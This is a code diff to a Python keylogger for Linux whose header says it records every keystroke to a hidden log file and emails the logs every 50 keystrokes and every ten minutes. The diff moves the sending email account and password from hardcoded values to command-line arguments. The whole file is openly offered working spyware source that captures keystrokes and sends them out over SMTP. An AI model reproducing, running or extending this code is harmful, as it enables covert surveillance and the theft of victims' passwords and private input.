@@ -1,3 +1,14 @@
+"""
+Auteur : Gwendoline Dossegger
+Date   : 20.07.2022
+Keylogger for Linux. It recovers all keystrokes and saves them to a hidden file in the executable directory.
+Every 50 keystrokes and every 10 minutes, sends a copy of the logs by email.
+The email account is passed as a parameter during execution.
+
+-- Use --
+python3 keylogger-smtp.py test@test.ch password
+"""
+
 #!/usr/bin/python
 import sys
 from subprocess import check_call
@@ -26,10 +37,10 @@ from email import encoders
 from time import sleep
 
 # Source : https://github.com/Sirius-Black4/keylogger
-def send_mail(m):
+def send_mail(m, email, password):
     # put your gmail id, password, sender address over here
-    email_user = 'MAIL'
-    email_password = 'PASSWORD'
+    email_user = email
+    email_password = password
 
     # put any subject you like
     subject = 'Keylogger Linux - Logs'
@@ -67,6 +78,8 @@ logging.basicConfig(handlers=[logging.FileHandler(filename=".logs_linux.txt", en
 
 # Action when key is pressed
 count = 0
+EMAIL = sys.argv[1]
+PASSWORD = sys.argv[2]
 def on_press(key):
     global count
     count += 1
@@ -77,7 +90,7 @@ def on_press(key):
 
     # Each 50 keys send keyboard logs by mail
     if count % 50 == 0:
-        send_mail("each 50 keys")
+        send_mail("each 50 keys",EMAIL,PASSWORD)
 
 # Keyboard listening
 listener = Listener(on_press=on_press)
